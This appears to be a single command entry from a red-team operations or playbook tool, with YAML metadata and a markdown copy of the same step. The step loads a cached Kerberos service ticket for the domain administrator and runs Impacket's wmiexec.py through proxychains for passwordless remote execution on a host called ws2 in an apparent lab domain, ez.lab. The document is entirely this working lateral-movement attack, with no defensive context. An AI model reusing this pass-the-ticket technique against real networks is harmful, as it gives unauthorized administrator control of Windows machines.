---
id: 7465de8a-1543-407d-9659-4e358fb0f788
name: Utilize the ST for future activity
type: command
executor: bash
data: 'export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache

  proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab'
output: null
created_at: '2023-04-06T03:56:06.311132+00:00'
updated_at: '2023-04-10T20:26:05.079234+00:00'
---

# Utilize the ST for future activity

```bash
export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
```
